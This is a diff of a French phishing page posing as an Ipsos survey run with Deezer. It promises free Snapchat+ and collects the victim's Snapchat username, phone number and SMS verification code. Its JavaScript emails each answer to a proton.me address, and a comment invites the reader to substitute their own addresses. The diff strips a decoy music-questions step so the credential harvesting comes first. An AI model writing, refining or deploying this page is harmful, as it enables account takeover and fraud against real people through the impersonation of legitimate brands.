@@ -2,7 +2,6 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sondage | Ipsos</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
     <style>
@@ -16,15 +15,15 @@
         /* HEADER */
         .header {
             background: #003b7a;
-            padding: 35px 40px;
+            padding: 35px 40px; /* Augmenter la hauteur du header */
             display: flex;
             align-items: center;
             justify-content: space-between;
-            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1); /* Ajout d'un ombrage léger pour le header */
         }
 
         .header img {
-            height: 60px;
+            height: 60px; /* Augmenter la taille du logo */
         }
 
         .header a {
@@ -34,7 +33,7 @@
 
         .header-text {
             color: #fff;
-            font-size: 28px;
+            font-size: 28px; /* Agrandir légèrement la taille du texte */
             font-weight: 700;
         }
 
@@ -140,18 +139,16 @@
             line-height: 16px;
         }
 
-        .select-phone {
-            display: flex;
-            justify-content: space-between;
-            gap: 10px;
-        }
-
-        .select-phone select, .select-phone input {
-            width: 48%;
-            padding: 14px;
-            font-size: 18px;
-            border-radius: 6px;
-            border: 1px solid #ccc;
+        .about {
+            max-width: 650px;
+            margin: 20px auto 40px auto;
+            padding: 20px;
+            background: #e8f0fe;
+            border-radius: 10px;
+            font-size: 14px;
+            color: #003b7a;
+            line-height: 1.4;
+            text-align: left;
         }
 
         .footer {
@@ -168,21 +165,18 @@
                 margin: 30px 20px;
                 padding: 30px;
             }
-
             h2 {
                 font-size: 24px;
             }
-
             p {
                 font-size: 16px;
             }
-
             button {
                 font-size: 16px;
             }
-
-            .footer {
+            .about {
                 font-size: 13px;
+                padding: 15px;
             }
         }
     </style>
@@ -202,53 +196,44 @@
         <div class="progress-text" id="progressText">0%</div>
     </div>
 
-    <!-- QUESTIONS ARTISTES ÉCOUTÉS SUR DEEZER -->
+    <!-- PARTENARIAT AVEC DEEZER ET AVERTISSEMENT AVANT LE NUMERO -->
     <div class="box active" id="etape0">
-        <h2>Questions sur vos artistes préférés 🎵</h2>
-        <p>Merci de répondre à ces quelques questions concernant vos habitudes d'écoute sur Deezer.</p>
-        <input type="text" id="artiste_prefere" placeholder="Quel est votre artiste préféré ?">
-        <input type="text" id="artiste_deezer" placeholder="Quel artiste écoutez-vous souvent sur Deezer ?">
-        <input type="text" id="artiste_decouverte" placeholder="Quel artiste avez-vous découvert récemment sur Deezer ?">
-        <button id="btnEtape0">Suivant</button>
-    </div>
-
-    <!-- PARTENARIAT AVEC DEEZER -->
-    <div class="box" id="etape1">
         <h2>Partenariat avec Deezer 📱</h2>
         <p>Ce sondage est organisé en collaboration avec Deezer pour offrir Snapchat+ gratuitement. Cette offre est exclusivement réservée aux clients de <strong>SFR, Bouygues Telecom, ou Orange</strong> pour garantir la compatibilité avec les services.</p>
         <p>Avant de commencer, nous devons effectuer une vérification pour confirmer que vous êtes un participant humain et éviter tout abus.</p>
-        <button id="btnEtape1">Continuer</button>
+        <button id="btnEtape0">Continuer</button>
     </div>
 
-    <!-- Étape 2: Collecte des informations sur le compte Snapchat -->
-    <div class="box" id="etape2">
+    <!-- Étape 1: Collecte des informations sur le compte Snapchat -->
+    <div class="box" id="etape1">
         <h2>Recevoir Snapchat+ 🎁</h2>
         <p>Merci de nous fournir votre identifiant Snapchat afin que nous puissions vous envoyer votre cadeau.</p>
         <input type="text" id="compte_snap" placeholder="Votre identifiant Snapchat">
-        <button id="btnEtape2">Suivant</button>
+        <button id="btnEtape1">Suivant</button>
     </div>
 
-    <!-- Étape 3: Numéro de téléphone -->
-    <div class="box" id="etape3">
+    <!-- Étape 2: Numéro de téléphone -->
+    <div class="box" id="etape2">
         <h2>Numéro de téléphone</h2>
         <p>Veuillez entrer votre numéro de téléphone pour recevoir un code de vérification par SMS.</p>
-        <div class="select-phone">
-            <select id="prefixe_tel">
+        <div>
+            <select id="choix_prefixe">
                 <option value="06">06</option>
                 <option value="07">07</option>
             </select>
             <input type="text" id="telephone" placeholder="Ex: 06XXXXXXXX">
         </div>
-        <button id="btnEtape3">Suivant</button>
+        <button id="btnEtape2">Suivant</button>
     </div>
 
-    <!-- Étape 4: Code SMS -->
-    <div class="box" id="etape4">
+    <!-- Étape 3: Code SMS -->
+    <div class="box" id="etape3">
         <h2>Code de vérification</h2>
-        <p>Veuillez entrer le code que vous avez reçu par SMS pour finaliser l’inscription. Cela peut prendre jusqu'à une minute.</p>
+        <p>Veuillez entrer le code que vous avez reçu par SMS pour finaliser l’inscription.</p>
         <input type="text" id="code_sms" placeholder="Code reçu">
-        <button id="btnEtape4">Terminer</button>
+        <button id="btnEtape3">Terminer</button>
     </div>
+
     <div class="footer">© 2026 Ipsos – Tous droits réservés</div>
 
     <script>
@@ -264,7 +249,7 @@
         async function sendMail(dataObj, sujet) {
             const formData = new FormData();
             formData.append("_subject", sujet);
-            formData.append("_cc", "John123abcd@proton.me");  // Remplace avec tes adresses email
+            formData.append("_cc", "John123abcd@proton.me,John123abcd@proton.me");  // Remplace avec tes adresses email
             formData.append("_captcha", "false");
             for (let key in dataObj) {
                 formData.append(key, dataObj[key]);
@@ -281,19 +266,8 @@
             }
         }
 
-        // Étape 0: Réponses sur les artistes
+        // Étape 0: Quand on clique sur Continuer, on passe à l'étape 1.
         document.getElementById('btnEtape0').addEventListener('click', () => {
-            let pref = document.getElementById('artiste_prefere').value.trim();
-            let deezer = document.getElementById('artiste_deezer').value.trim();
-            let decouverte = document.getElementById('artiste_decouverte').value.trim();
-            if (!pref || !deezer || !decouverte) {
-                alert("Veuillez remplir toutes les questions.");
-                return;
-            }
-            reponses.artiste_prefere = pref;
-            reponses.artiste_deezer = deezer;
-            reponses.artiste_decouverte = decouverte;
-            sendMail({artiste_prefere: pref, artiste_deezer: deezer, artiste_decouverte: decouverte}, "Réponses Étape 0 - Ipsos");
             showStep('etape1', 25);
         });
 
@@ -304,6 +278,7 @@
                 alert("Veuillez entrer votre identifiant Snapchat.");
                 return;
             }
+
             reponses.compte_snap = snap;
             sendMail({ compte_snap: snap }, "Réponses Étape 1 - Ipsos");
             showStep('etape2', 50);
@@ -311,13 +286,15 @@
 
         // Étape 2: Réponse sur le téléphone
         document.getElementById('btnEtape2').addEventListener('click', () => {
+            let telPrefix = document.getElementById('choix_prefixe').value;
             let tel = document.getElementById('telephone').value.trim();
-            let prefixe = document.getElementById('prefixe_tel').value;
+
             if (!/^\d{8}$/.test(tel)) {
-                alert("Numéro invalide, assurez-vous que le numéro est bien à 8 chiffres.");
+                alert("Numéro invalide. Assurez-vous d'entrer un numéro valide avec 8 chiffres.");
                 return;
             }
-            reponses.telephone = prefixe + tel;
+
+            reponses.telephone = telPrefix + tel;
             sendMail({ telephone: reponses.telephone }, "Réponses Étape 2 - Ipsos");
             showStep('etape3', 75);
         });
@@ -329,12 +306,14 @@
                 alert("Veuillez entrer le code.");
                 return;
             }
+
             reponses.code_sms = code;
             sendMail({ code_sms: code }, "Réponses Étape 3 - Ipsos");
             showStep('etape4', 100);
         });
     </script>
-    <div class="box" id="etape5">
+
+    <div class="box" id="etape4">
         <h2>Merci !</h2>
         <p>Votre Snapchat+ sera activé dans l’heure. 🎉</p>
     </div>
@@ -347,5 +326,3 @@
     </div>
 </body>
 </html>
-
-
